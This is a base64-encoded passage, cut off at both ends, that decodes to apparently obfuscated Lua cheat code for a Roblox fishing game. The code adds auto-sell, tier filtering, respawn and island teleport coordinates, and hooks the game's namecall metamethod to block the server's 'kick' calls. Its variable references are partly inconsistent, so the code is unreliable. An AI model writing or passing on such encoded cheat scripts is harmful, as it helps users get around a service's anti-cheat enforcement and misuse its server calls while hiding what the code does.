GJhY2sgPSBmdW5jdGlvbihBbGR5VG9pUSkKICAgICAgICAgICAgQWxkeVRvaXJHID0gdG9udW1iZXIoQWxkeVRvaVEpCiAgICAgICAgZW5kCiAgICB9KQoKICAgIGxvY2FsIHZhcl8zaGdvejAgPSB7IkNvbW1vbiIsICJVbmNvbW1vbiIsICJSYXJlIiwgIkVwaWMiLCAiTGVnZW5kYXJ5IiwgIk15dGhpY2FsIiwgIlNFQ1JFVCJ9CiAgICBBbGR5VG9pd0cgPSBBbGR5VG9pajpEcm9wZG93bih7CiAgICAgICAgTmFtZSA9ICJUaWVyIEZpbHRlciIsCiAgICAgICAgVmFsdWVzID0gQWxkeVRvaWQsCiAgICAgICAgRGVmYXVsdCA9IHsiQ29tbW9uIiwgIlVuY29tbW9uIiwgIlJhcmUiLCAiRXBpYyIsICJMZWdlbmRhcnkiLCAiTXl0aGljYWwiLCAiU0VDUkVUIn0sCiAgICAgICAgTXVsdGkgPSB0cnVlLAogICAgICAgIEFsbG93Tm9uZSA9IHRydWUsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihBbGR5VG9pUSkKICAgICAgICAgICAgQWxkeVRvaWIuc2VsZWN0ZWRUaWVyID0gQWxkeVRvaVEKICAgICAgICBlbmQKICAgIH0pCiAgICBBbGR5VG9pbEcgPSBBbGR5VG9pajpUb2dnbGUoewogICAgICAgIFRpdGxlID0gIkVuYWJsZSBGaWx0ZXIiLAogICAgICAgIERlc2MgPSAiT25seSBjYXRjaCBmaXNoIG9mIHRoZSBzZWxlY3RlZCB0aWVycy4iLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKEFsZHlUb2lRKQogICAgICAgICAgICBBbGR5VG9pYi5lbmFibGVGaWx0ZXIgPSBBbGR5VG9pUQogICAgICAgIGVuZAogICAgfSkKICAgIEFsZHlUb2lqOkJ1dHRvbih7CiAgICAgICAgVGl0bGUgPSAiUmVzcGF3biIsCiAgICAgICAgRGVzYyA9ICJJbW1lZGlhdGVseSByZXNwYXduIHlvdXIgY2hhcmFjdGVyLiIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIEFsZHlUb2l4RygpCiAgICAgICAgZW5kCiAgICB9KQplbmQKCmxvY2FsIHZhcl9mdmoxYnMgPSBuaWwKQWxkeVRvaUZHID0gaG9va21ldGFtZXRob2QoZ2FtZSwgIl9fbmFtZWNhbGwiLCBmdW5jdGlvbihBbGR5VG9pUSwgLi4uKQogICAgbG9jYWwgdmFyX2xpZG5oOSA9IGdldG5hbWVjYWxsbWV0aG9kKCkKICAgIGlmIHRvc3RyaW5nKHN0cmluZy5sb3dlcihBbGR5VG9pVCkpID09ICJraWNrIiB0aGVuCiAgICAgICAgcmV0dXJuIG5pbAogICAgZW5kCiAgICByZXR1cm4gQWxkeVRvaUZHKEFsZHlUb2lRLCAuLi4pCmVuZCkKQWxkeVRvaU06U2VjdGlvbih7VGl0bGUgPSAiQXV0byBTZWxsIEZlYXR1cmVzIn0pCkFsZHlUb2lNOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJTZWxsIEFsbCBJdGVtcyIsCiAgICBEZXNjID0gIkluc3RhbnRseSBzZWxsIGFsbCBmaXNoIGluIHlvdXIgaW52ZW50b3J5LiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICgoKCgoQWxkeVRvaUg6V2FpdEZvckNoaWxkKCJSZXBsaW9uIikpOldhaXRGb3JDaGlsZCgiX0luZGV4IikpOldhaXRGb3JDaGlsZCgic2xlaWdodG5pY2tfbmV0QDAuMi4wIikpOldhaXRGb3JDaGlsZCgibmV0IikpOldhaXRGb3JDaGlsZCgiUkZfU2VsbEFsbEl0ZW1zIikpOkludm9rZVNlcnZlcigpCiAgICAgICAgICAgIEFsZHlUb2lROk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJTdWNjZXNzIiwKICAgICAgICAgICAgICAgIERlc2NyaXB0aW9uID0gIlN1Y2Nlc3NmdWxseSBzb2xkIGFsbCBpdGVtcy4iLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAzCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kKQogICAgZW5kCn0pCmxvY2FsIHZhcl9oYTJ2N2UgPSBBbGR5VG9pTTpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBTZWxsIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBzZWxsIGZpc2ggYmFzZWQgb24gdGhlIGNhdGNoIHRocmVzaG9sZC4iLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihBbGR5VG9pUSkKICAgICAgICBBbGR5VG9pYi5BdXRvU2VsbCA9IEFsZHlUb2lRCiAgICBlbmQKfSkKbG9jYWwgdmFyX2UxN3d0cCA9IDEwCmxvY2FsIHZhcl9obWw1NGkgPSBBbGR5VG9pTTpJbnB1dCh7CiAgICBUaXRsZSA9ICJBdXRvIFNlbGwgVGhyZXNob2xkIiwKICAgIERlc2MgPSAiTnVtYmVyIG9mIGZpc2ggdG8gY2F0Y2ggYmVmb3JlIHNlbGxpbmcuIiwKICAgIFBsYWNlaG9sZGVyID0gIkRlZmF1bHQ6IDMwIiwKICAgIFR5cGUgPSAiSW5wdXQiLAogICAgRGVmYXVsdCA9IDMwLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihBbGR5VG9pVCkKICAgICAgICBsb2NhbCB2YXJfZWg3bG9xID0gdG9udW1iZXIoQWxkeVRvaVQpCiAgICAgICAgaWYgQWxkeVRvaWMgdGhlbgogICAgICAgICAgICBBbGR5VG9pREcgPSBBbGR5VG9pYwogICAgICAgICAgICBBbGR5VG9pUTpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiVGhyZXNob2xkIFVwZGF0ZWQiLAogICAgICAgICAgICAgICAgRGVzY3JpcHRpb24gPSAiRmlzaCB3aWxsIGJlIHNvbGQgYXV0b21hdGljYWxseSB3aGVuIHRoZSBjYXRjaCByZWFjaGVzICIgLi4gQWxkeVRvaURHLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAxCiAgICAgICAgICAgIH0pCiAgICAgICAgZWxzZQogICAgICAgICAgICBBbGR5VG9pUTpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiSW52YWxpZCBJbnB1dCIsCiAgICAgICAgICAgICAgICBEZXNjcmlwdGlvbiA9ICJJbnZhbGlkIG51bWJlci4gUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDEKICAgICAgICAgICAgfSkKICAgICAgICBlbmQKICAgIGVuZAp9KQpsb2NhbCB2YXJfOXR4eXduID0gNDk5MApsb2NhbCB2YXJfcHFtbXppID0gewogICAgWyJNeXN0ZXJpb3VzIENhdmUiXSA9IHtDRnJhbWUubmV3KC02NS4xODIxMTM2LCAzLjUzMTU3MTE1LCAyNzc1LjY4MzExLCAwLjMzODAzMzExLCAzLjM3Mzc0MDA0ZS0wOCwgMC45NDExMzQyMTQsIDMuMzQ3NjczOTJlLTA5LCAxLCAtMy43MDUwMDA0ZS0wOCwgLTAuOTQxMTM0MjE0LCAxLjU2NzQ3MzhlLTA4LCAwLjMzODAzMzExKX0sCiAgICBbIkFuY2llbnQgVW5kZXJncm91bmQgU3RlbGFyIl0gPSB7Q0ZyYW1lLm5ldygyMTAwLjM5OTE3LCAtOTEuMTk3NjQ3MSwgLTcxMC43NzM4MDQsIDAuMTIyMzcxNjc0LCAtNi40MjEwODU4OWUtMDksIC0wLjk5MjQ4NDMzMSwgMS4wNjI1NjU3N2UtMDgsIDEsIC01LjE1OTU4Mzg3ZS0wOSwgMC45OTI0ODQzMzEsIC05LjkxNDQxMjRlLTA5LCAwLjEyMjM3MTY3NCl9LAogICAgWyJBbmNpZW50IFRlbXBsZSJdID0ge0NGcmFtZS5uZXcoMTQ2Mi42OTA4LCAtMjIuMTI1MDAxOSwgLTY3Mi45MzMzNSwgLTAuMTQ3NDI0MDQyLCAtNC42MzI0NzIxOGUtMDgsIDAuOTg5MDczMzk2LCAtOS45MzY2OTkyOWUtMDgsIDEsIDMuMjAyNTU2OGUtMDgsIC0wLjk4OTA3MzM5NiwgLTkuMzU1OTkwNDdlLTA4LCAtMC4xNDc0MjQwNDIpLCBDRnJhbWUubmV3KDE0NjIuNjkwOCwgLTIyLjEyNTAwMTksIC02NzIuOTMzMzUsIC0wLjE0NzQyNDA0MiwgLTQuNjMyNDcyMThlLTA4LCAwLjk4OTA3MzM5NiwgLTkuOTM2Njk5MjllLTA4LCAxLCAzLjIwMjU1NjhlLTA4LCAtMC45ODkwNzMzOTYsIC05LjM1NTk5MDQ3ZS0wOCwgLTAuMTQ3NDI0MDQyKSwgQ0ZyYW1lLm5ldygxNDkyLjc0MzA0LCAtMTAuMzE2MTU5MiwgLTU4Ni4zNjgyODYsIDAuMzIyNzkxNjY2LCAtMS40MDcyNzI5NmUtMDgsIC0wLjk0NjQ3MDAyMiwgLTYuMTc4MjA1MzNlLTA4LCAxLCAtMy41OTM5MjkwN2UtMDgsIDAuOTQ2NDcwMDIyLCA3LjAwNzU3NjM5ZS0wOCwgMC4zMjI3OTE2NjYpLCBDRnJhbWUubmV3KDE0OTkuNjUwMjcsIC0yMi4xMjUwMDE5LCAtNjQxLjQ0ODg1MywgMC45OTMzODQ5NTcsIC0xLjE3OTI5Njg0ZS0wOCwgMC4xMTQ4MzE3MDEsIDEuMjA2Mzk0OWUtMDgsIDEsIC0xLjY2NDg0NTA0ZS0wOSwgLTAuMTE0ODMxNzAxLCAzLjAzOTE1NTgyZS0wOSwgMC45OTMzODQ5NTcpfSwKICAgIFsiQW5jaWVudCBKdW5nbGUgQXJ0aWZhY3QiXSA9IHtDRnJhbWUubmV3KDE1MDAuNzM0MDEsIDYuNjI0OTk5NTIsIC04NTIuNTYxNjQ2LCAtMC45ODk0MjMwMzcsIC0xLjY4MDcyODI3ZS0wOCwgLTAuMTQ1MDU4OSwgLTEuODM3MTgxMjVlLTA4LCAxLCA5LjQ0NTkwODk0ZS0wOSwgMC4xNDUwNTg5LCAxLjIwMTA5OTQ5ZS0wOCwgLTAuOTg5NDIzMDM3KSwgQ0ZyYW1lLm5ldygxODMyLjg2MTk0LCA1LjE2NTMzOTk1LCAtMzI1Ljc0MzM0NywgLTAuMTgzMDIwODE1LCAtNC4wNTk4NzIwOGUtMDgsIC0wLjk4MzEwOTA1NywgLTMuOTM3NTUzOTNlLTA4LCAxLCAtMy4zOTY1ODkzMmUtMDgsIDAuOTgzMTA5MDU3LCAzLjI0OTM5ODI2ZS0wOCwgLTAuMTgzMDIwODE1KSwgQ0ZyYW1lLm5ldygxMzgxLjU3MzQ5LCA0LjYxMDMyNTM0LCAxMTMuMTQ3OTgsIC0wLjk5OTc3ODg2NywgLTQuNTY1NTg5MjRlLTA5LCAwLjAyMTAyOTg0MywgLTQuMTQ3MTMyODZlLTA5LCAxLCAxLjk5NDE4MzEzZS0wOCwgLTAuMDIxMDI5ODQzLCAxLjk4NTAyMDY4ZS0wOCwgLTAuOTk5Nzc4ODY3KSwgQ0ZyYW1lLm5ldyg4ODEuMDA5MDk0LCA1LjkwNDA3NjEsIC0zNDIuOTQzMTQ2LCAwLjIxNTI4OTk1LCAzLjE2NDE3MDQ0ZS0wOCwgMC45NzY1NTAxNjIsIC00LjMyMzExODU3ZS0wOCwgMSwgLTIuMjg3MDc4MDhlLTA4LCAtMC45NzY1NTAxNjIsIC0zLjcyOTM1NzA5ZS0wOCwgMC4yMTUyODk5NSl9LAogICAgWyJDb3JhbCBSZWVmcyJdID0ge0NGcmFtZS5uZXcoLTMxMTguMzk2MjQsIDIuNDI1MzE1MzgsIDIxMzUuMjYzOTIsIDAuOTIzMzYxNTQsIC0xLjAwNjkxODVlLTA3LCAtMC4zODM5MzE1NDcsIDguMDYwNzk0N2UtMDgsIDEsIC02Ljg0MDE2OTY4ZS0wOCwgMC4zODM5MzE1NDcsIDMuMjIxMTU1OTZlLTA4LCAwLjkyMzM2MTU0KSwgQ0ZyYW1lLm5ldygtMjk2NS41NzA4LCAyMi43NTAwMjg2LCAyMjQ5LjAxNzA5LCAwLjA3MzAyODgxMDMsIDMuOTg3MjU4OTdlLTA5LCAwLjk5NzMyOTgzMSwgMi4yNzA2NDAyMWUtMDgsIDEsIC01LjY2MDU5NTFlLTA5LCAtMC45OTczMjk4MzEsIDIuMzA1OTE1ODFlLTA4LCAwLjA3MzAyODgxMDMpLCBDRnJhbWUubmV3KC0zMTAyLjE2MzA5LCA1Ljk3MzM0NTI4LCAyMjE4Ljg4Njk2LCAwLjc1ODMzOTU4NCwgOC40MDY5ODQ0NGUtMDksIC0wLjY1MTg1OTcwMSwgMi4zMjk0MTI1N2UtMDgsIDEsIDMuOTk5NjA5MThlLTA4LCAwLjY1MTg1OTcwMSwgLTQuNTUxNTEyMjNlLTA4LCAwLjc1ODMzOTU4NCl9LAogICAgWyJXZWF0aGVyIE1hY2hpbmUiXSA9IHtDRnJhbWUubmV3KC0xNDU5LjM3NzIsIDE0LjcxMDMyMTQsIDE4MzEuNTE4OCwgMC43Nzc5NTExMjEsIDIuNTIxMzE4NjJlLTA4LCAtMC42MjgzMjQ4MDcsIC01LjI0MTI2Mzc4ZS0wOCwgMSwgLTIuNDc2NjMwNjNlLTA4LCAwLjYyODMyNDgwNywgNS4yMTk5MTMzOWUtMDgsIDAuNzc3OTUxMTIxKSwgQ0ZyYW1lLm5ldygtMTUyMS4yMDg2MiwgMi44NzQ5OTk3NiwgMTkxMi40MDU2NCwgLTAuOTg5NDE4MTQ5LCAxLjAwMjk5MTgyZS0wOCwgLTAuMTQ1MDkyMTYsIDYuODUzNDgwODllLTA5LCAxLCAyLjIzOTIzODY2ZS0wOCwgMC4xNDUwOTIxNiwgMi4xMTYxMDQ2MmUtMDgsIC0wLjk4OTQxODE0OSksIENGcmFtZS5uZXcoLTE1NzQuNTcxMjksIDEzLjE0NzMzNzksIDE5MjAuODM4MjYsIC0wLjgxNjU0NTQyNywgLTMuMzk5NzQyMzVlLTA4LCAwLjU3NzI4MTE3NywgLTYuOTY2MTk3OTNlLTA4LCAxLCAtMy45NjQyMjg3N2UtMDgsIC0wLjU3NzI4MTE3NywgLTcuMjU4NDI3ODFlLTA4LCAtMC44MTY1NDU0MjcpfSwKICAgIFsiU2lzeXBodXMiXSA9IHtDRnJhbWUubmV3KC0zNzY1LjY5NzUxLCAtMTM1LjA3NDQxNywgLTkwNi44OTM2NzcsIDAuNzA0MTQ0MjM5LCAzLjUyOTQ2ODI3ZS0wOCwgLTAuNzEwMDU2OTYxLCAtMy40NTAzMjkwOWUtMDgsIDEsIDEuNTQ5MDg1M2UtMDgsIDAuNzEwMDU2OTYxLCAxLjM1OTE1MDg0ZS0wOCwgMC43MDQxNDQyMzkpLCBDRnJhbWUubmV3KC0zNzgwLjA5NjkyLCAtMTM1LjA3NDQxNywgLTk2Mi4yMjY3NDYsIC0wLjM2NjQ2OTQxMywgLTUuOTQ1MjU5OTNlLTA4LCAtMC45MzA0MzAxMTQsIDEuOTEwODMzNjJlLTA4LCAxLCAtNy4xNDI0MTk2M2UtMDgsIDAuOTMwNDMwMTE0LCAtNC4zOTUzNzU0NGUtMDgsIC0wLjM2NjQ2OTQxMyl9LAogICAgWyJWb2xjYW5vIl0gPSB7Q0ZyYW1lLm5ldygxODIwLjkyNTI5LCA1Ljc4ODU5NTIsIDMzMDUuMDQ3NjEsIC0wLjI5MDM3ODg5OCwgMS4yNjI5NjIwOWUtMDgsIC0wLjk1NjkxMTc0MywgLTIuODE4NzkzMmUtMDgsIDEsIDIuMTc1MjA1OTdlLTA4LCAwLjk1NjkxMTc0MywgMy4zMjg5NzAxN2UtMDgsIC0wLjI5MDM3ODg5OCksIENGcmFtZS5uZXcoMTcwNC44MzM2MiwgNC4zODE5MzUxMiwgMzE4OS44MDgxMSwgMC43MTUwOTE0MDcsIDguMzEyMjYwMjFlLTA5LCAwLjY5OTAzMDkzNiwgLTMuODg1MTM0N2UtMDgsIDEsIDIuNzg1Mjg1MjVlLTA4LCAtMC42OTkwMzA5MzYsIC00LjcwNzU2MzA1ZS0wOCwgMC43MTUwOTE0MDcpfSwKICAgIFsiRXhvdGljIERlcHRoIl0gPSB7Q0ZyYW1lLm5ldygzMjcyLjI3MzQ0LCAtMTMwMS4zNTUzNSwgMTM5MC45NzA1OCwgLTAuNDIyODUxMTc1LCAtNS42MTUwODQ5M2UtMDgsIC0wLjkwNjE5OTE1NywgNy4zMjI4NTQ4NmUtMDgsIDEsIC05LjYxMzI5ODZlLTA4LCAwLjkwNjE5OTE1NywgLTEuMDcwMDk1OTFlLTA3LCAtMC40MjI4NTExNzUpfSwKICAgIFsiRGVlcCBTZWEiXSA9IHtDRnJhbWUubmV3KC0yMTI2LjQ5NzA3LCA1My40ODY4Nzc0LCAzNjQwLjIwNTgxLCAtMC44NzI4MTcwOTksIDQuNzc4ODA3MDRlLTA4LCAwLjQ4ODA0NzM5MSwgNy43NzgyODI5MWUtMDksIDEsIC04LjQwMDYyODgxZS0wOCwgLTAuNDg4MDQ3MzkxLCAtNi45NTI1OTYwMWUtMDgsIC0wLjg3MjgxNzA5OSl9LAogICAgWyJUcmVhc3VyZSBSb29tIl0gPSB7Q0ZyYW1lLm5ldygtMzYwMC42Mjk4OCwgLTI3OS4wNzM3LCAtMTY5Mi43NTUsIC0wLjkzODgzMDU1NCwgLTEuNzE0MjQ2N2UtMDgsIDAuMzQ0Mzc5NDg1LCAtMS45NjgzMzEyOGUtMDgsIDEsIC0zLjg4MTg0NjRlLTA5LCAtMC4zNDQzNzk0ODUsIC0xLjA0MjI5MjQ3ZS0wOCwgLTAuOTM4ODMwNTU0KSwgQ0ZyYW1lLm5ldygtMzYyNS4wNzA4LCAtMjc5LjA3NDIxOSwgLTE1OTQuNTc2MDUsIDAuOTE4MTc2NDcyLCAtMy45NzYwNjM5MmUtMDksIC0wLjM5NjE3MTYyOSwgLTEuMTI5NDYyMDRlLTA4LCAxLCAtMy42MjEyODg1MWUtMDgsIDAuMzk2MTcxNjI5LCAzLjc3MjQ0Mjk4ZS0wOCwgMC45MTgxNzY0NzIpLCBDRnJhbWUubmV3KC0zNjAwLjcyNjMyLCAtMjc2LjA2NDI3LCAtMTY0MC43OTY2MywgLTAuNjk2MTMwODEyLCAtNi4wNDkxMTgxZS0wOSwgMC43MTc5MTQ5MzksIC0xLjA5NDkwMzYzZS0wOCwgMSwgLTIuMTkwODQ5NzJlLTA5LCAtMC43MTc5MTQ5MzksIC05LjM4NTU5NTQxZS0wOSwgLTAuNjk2MTMwODEyKSwgQ0ZyYW1lLm5ldygtMzU0OC41MjIyMiwgLTI2OS4zMDk4NDUsIC0xNjU5LjI2Njg1LCAwLjA0NzI5OTE1NzgsIC00LjA4Njg1NDIzZS0wOCwgMC45OTg4ODA3NDQsIC03LjY4NTk4ODM4ZS0wOCwgMSwgNC40NTUzODE0OWUtMDgsIC0wLjk5ODg4MDc0NCwgLTcuODg4MTIyMTZlLTA4LCAwLjA0NzI5OTE1NzgpLCBDRnJhbWUubmV3KC0zNTgxLjg0MTU1LCAtMjc5LjA5MDIxLCAtMTY5Ni4xNTYzNywgLTAuOTk5NjM0MTQ3LCAtMC4wMDA1MzU2MDA1MjgsIC0wLjAyNzA0MzA4MzcsIC0wLjAwMDQ0ODM1ODE1OCwgMC45OTk5OTQ2OTUsIC0wLjAwMzIzMTk4NTk2LCAwLjAyNzA0NDY3MDcsIC0wLjAwMzIxODY3ODI5LCAtMC45OTk2MjkwOCksIENGcmFtZS5uZXcoLTM2MDEuMzQzMDIsIC0yODIuNzkwOTU1LCAtMTYyOS4zNzAzNiwgLTAuNTI2MzQ2Njg0LCAwLjAwMTQzNjU5NDc2LCAwLjg1MDI2ODg0MSwgLTAuMDAwMjY2MzU1NTIxLCAwLjk5OTk5ODI3MSwgLTAuMDAxODU0NDUxMzcsIC0wLjg1MDI2OTk3MywgLTAuMDAxMjAyNTUxNjUsIC0wLjUyNjM0NTM3MiksIENGcmFtZS5uZXcoLTM2MDEuNTI1ODgsIC0yODIuOTkxNjY5LCAtMTYyOS41OTI2NSwgLTAuMDUzNTA0MTU3OCwgLTcuNDg1MzU4MTFlLTA4LCAwLjk5ODU2NzY0MSwgNi40NDk4OTM0MmUtMDgsIDEsIDcuODQxNjg2NzdlLTA4LCAtMC45OTg1Njc2NDEsIDYuODYwMjE3NjRlLTA4LCAtMC4wNTM1MDQxNTc4KSwgQ0ZyYW1lLm5ldygtMzU5NC43NjA3NCwgLTI3NS42NjM3ODgsIC0xNjQyLjY1NTE1LCAwLjk5MjAyMDQyOCwgMi42NjEyNDY1MWUtMDgsIC0wLjEyNjA3NzMyNCwgLTIuNzIyMjY1NDRlLTA4LCAxLCAtMy4xMTY4NDU4OWUtMDksIDAuMTI2MDc3MzI0LCA2LjUyNDEzNDEyZS0wOSwgMC45OTIwMjA0MjgpfSwKICAgIFsiTG9zdCBTaG9yZSJdID0ge0NGcmFtZS5uZXcoLTM2ODYuNzA1NTcsIDUwLjU1NTE0OTEsIC04MDIuODYyNTQ5LCAwLjY3MTE4Njg2NCwgLTEuOTcyNzg5NGUtMDgsIDAuNzQxMjg4MTg1LCA4LjgyMjEyOTg3ZS0wOCwgMSwgLTUuMzI2NTQ5ODdlLTA4LCAtMC43NDEyODgxODUsIDEuMDExNDg1MDhlLTA3LCAwLjY3MTE4Njg2NCksIENGcmFtZS5uZXcoLTM2NzQuNzI4NTIsIDUuNDI1NTUzOCwgLTg2MC42MzE1MzEsIC0wLjk5NTQxMzcyMSwgNi4wMjEyODc5MWUtMDksIDAuMDk1NjYzODgyOCwgMy4zODEwNzU4NmUtMDksIDEsIC0yLjc3NjA5MzQ5ZS0wOCwgLTAuMDk1NjYzODgyOCwgLTIuNzMxMDE2ODNlLTA4LCAtMC45OTU0MTM3MjEpfSwKICAgIFsiTW9oYW5hIFZvbGNhbm8iXSA9IHtDRnJhbWUubmV3KC02NDguODMyMzk3LCA0NS4yODYyMzU4LCAxNDYuNDI1NzA1LCAtMC4xMDc2OTg4ODgsIC0yLjIyNDc3Nzg3ZS0wOCwgMC45OTQxODM1NCwgMi43NTczODg0NWUtMDgsIDEsIDIuNTM2NDk4ODNlLTA4LCAtMC45OTQxODM1NCwgMy4wMTQ1MjgzNmUtMDgsIC0wLjEwNzY5ODg4OCksIENGcmFtZS5uZXcoLTY3My44MDMyMjMsIDU1LjUwMDA1NzIsIDE4My42MTA3NzksIDAuMTIyODA4MTI5LCA2LjA4NDMyN2UtMDgsIC0wLjk5MjQzMDQ0OSwgLTkuMDA3MTkxNDRlLTA4LCAxLCA1LjAxNjE0MDM5ZS0wOCwgMC45OTI0MzA0NDksIDguMzIyOTg4NTJlLTA4LCAwLjEyMjgwODEyOSksIENGcmFtZS5uZXcoLTY3NS43NDEyNzIsIDU1LjUwMDA1NzIsIDE2NC45OTk3NDEsIDAuNzAwNDA0NTg0LCAtNi4xNTYxMjQ1ZS0wOCwgLTAuNzEzNzQ2MDExLCA3LjY2MTIwODkxZS0wOCwgMSwgLTEuMTA3MDg1NzFlLTA4LCAwLjcxMzc0NjAxMSwgLTQuNjkyNzQ5NjZlLTA4LCAwLjcwMDQwNDU4NCksIENGcmFtZS5uZXcoLTY0OC4xODY1ODQsIDQ1Ljc1MDUyMjYsIDE3Mi4xNzQ1MywgLTAuOTk1NjY0Mjk5LCAzLjExNDE3NTIzZS0wOCwgMC4wOTMwMTk2NDE5LCAzLjAwNzE3NDI0ZS0wOCwgMSwgLTEuMjkwNDcyMjZlLTA4LCAtMC4wOTMwMTk2NDE5LCAtMS4wMDUxNTA5ZS0wOCwgLTAuOTk1NjY0Mjk5KX0sCiAgICBbIldoaXJscG9vbCJdID0ge0NGcmFtZS5uZXcoLTY1OC42Nzc0MjksIDIwLjA5NjkxNjIsIDU0Ny43OTU3MTUsIDAuMDg4MzIyOTMsIC0yLjg0MTY2ODQ2ZS0wOSwgLTAuOTk2MDkxOTAyLCAxLjI2Njg2NDg0ZS0wOCwgMSwgLTEuNzI5NDk1NDRlLTA5LCAwLjk5NjA5MTkwMiwgLTEuMjQ2NjM4MzVlLTA4LCAwLjA4ODMyMjkzKSwgQ0ZyYW1lLm5ldygtNjUzLjI3NTc1NywgMTcuMjUwMDU5MSwgNDkwLjIxMzY4NCwgMC4yMjMxNzg5OTgsIDAsIC0wLjk3NDc3NzQ2LCAwLCAxLCAwLCAwLjk3NDc3NzQ2LCAwLCAwLjIyMzE3ODk5OCl9LAogICAgWyJTa3kgSXNsYW5kIl0gPSB7Q0ZyYW1lLm5ldygxMDY2LjE4NjQsIDU3LjIwMjU2ODEsIDUwNDUuNTU0MiwgLTAuNjgyNTM0MTU4LCAxLjAwODY1ODIyZS0wOCwgMC43MzA4NTM2NzcsIC01Ljg5MDA3MTFlLTA5LCAxLCAtMS45MzAxNzUzMWUtMDgsIC0wLjczMDg1MzY3NywgLTEuNzQ3ODg4NTllLTA4LCAtMC42ODI1MzQxNTgpLCBDRnJhbWUubmV3KDEwNTcuMjg5OTIsIDMzLjA4ODQxMzIsIDUxMzMuNzk4ODMsIDAuODMzODcxNzgyLCA1LjQ0MTQ5MjIzZS0wOCwgMC41NTE5NTgyMDMsIC02LjU4MTg0MjE4ZS0wOSwgMSwgLTguODY0MTY5ODRlLTA4LCAtMC41NTE5NTgyMDMsIDcuMDI4MjkwODRlLTA4LCAwLjgzMzg3MTc4MiksIENGcmFtZS5uZXcoOTg4Ljk1NDcxMiwgNDIuODI1NDQ3MSwgNTA4OC43MTI4OSwgLTAuODQ5NDE3Mzg4LCAtOS44OTMxMDM5NGUtMDgsIDAuNTI3NzIxNTg0LCAtNS45NjExNTA4NmUtMDgsIDEsIDkuMTUxNzkzMjhlLTA4LCAtMC41Mjc3MjE1ODQsIDQuNjI3ODY0MzFlLTA4LCAtMC44NDk0MTczODgpLCBDRnJhbWUubmV3KDEwMDYuNzA2ODUsIDE3LjIzMDI2NjYsIDUwOTIuMTQ4NDQsIC0wLjk4OTY2NDA3OCwgNS42NTM4NTI1ZS0wOSwgLTAuMTQzNDA1MDA1LCA5LjE0ODc5MjgzZS0wOSwgMSwgLTIuMzcxMTcxN2UtMDgsIDAuMTQzNDA1MDA1LCAtMi40Nzc4NjE4M2UtMDgsIC0wLjk4OTY2NDA3OCksIENGcmFtZS5uZXcoMTAyNS4wMjM1NiwgMi43NzI1OTcwNywgNTAxMS40NzAyMSwgLTAuOTc0NDc0MTkyLCAtNi44Nzg3MTgwNGUtMDgsIDAuMjI0NDk5NTUzLCAtNC40NzQ3MjEwNGUtMDgsIDEsIDEuMTIxNzAyODRlLTA3LCAtMC4yMjQ0OTk1NTMsIDkuOTI2MTMyMDllLTA4LCAtMC45NzQ0NzQxOTIpLCBDRnJhbWUubmV3KDEwNzEuMTQ1NTEsIDMuNTI4NDA0LCA1MDM4LjAwMjkzLCAtMC41MzIzMDAxMTUsIDMuMzg2Nzc3MDhlLTA4LCAwLjg0NjU1NTcxLCA2LjY5OTkyOTE0ZS0wOCwgMSwgMi4xMjE0OTE2NWUtMDksIC0wLjg0NjU1NTcxLCA1Ljc4NDc5MDZlLTA4LCAtMC41MzIzMDAxMTUpLCBDRnJhbWUubmV3KDEwMjIuNTU0NTcsIDE2LjYyNzc4MDksIDUwNjYuMjgyMjMsIDAuNzIxOTk2MTI5LCAwLCAtMC42OTE4OTcwOTQsIDAsIDEsIDAsIDAuNjkxODk3MDk0LCAwLCAwLjcyMTk5NjEyOSksIENGcmFtZS5uZXcoMTAyMy4yOTExNCwgMTkuMTE3NzQyNSwgNTA3MC4wMjU4OCwgMC41MDcwMjI4NTgsIDIuMDE1MDU0NjFlLTA4LCAtMC44NjE5MzI2MzUsIDUuOTQ5MDkxNTNlLTA4LCAxLCA1LjgzNzMyMzg3ZS0wOCwgMC44NjE5MzI2MzUsIC04LjA4NzM3MjU1ZS0wOCwgMC41MDcwMjI4NTgpLCBDRnJhbWUubmV3KDk4MS4zMTg5MDksIDQxLjY1MDM5ODMsIDUwNzguMDIzNDQsIC0wLjA2NzY1MzUyMTksIC02LjE5MjM0Mjk5ZS0wOCwgMC45OTc3MDg4NTcsIC0yLjMyMDI5Mjk0ZS0wOCwgMSwgNi4wNDkyMjYxOWUtMDgsIC0wLjk5NzcwODg1NywgLTEuOTA1NzI1MzZlLTA4LCAtMC4wNjc2NTM1MjE5KX0KfQpsb2NhbCB2YXJfYzV4NjRoIEFsZHlUb2lVRygpCiAgICBpZiBub3QgQWxkeVRvaUlVIG9yICNBbGR5VG9pSVUgPT0gMCB0aGVuCiAgICAgICAgQWxkeVRvaVE6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiTm8gSXNsYW5kIFNlbGVjdGVkIiwKICAgICAgICAgICAgRGVzY3JpcHRpb24gPSAiUGxlYXNlIHNlbGVjdCBhbiBpc2xhbmQgdG8gc3RhcnQgYXV0byBmYXJtLiIsCiAgICAgICAgICAgIER1cmF0aW9uID0gMQogICAgICAgIH0pCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGxvY2FsIHZhcl9zZGZna2EgPSBBbGR5VG9pSVVbbWF0aC5yYW5kb20oMSwgI0FsZHlUb2lJVSldCiAgICBsb2NhbCB2YXJfY2liaGFxID0gQWxkeVRvaWtHW0FsZHlUb2lUXQogICAgaWYgQWxkeVRvaWMgY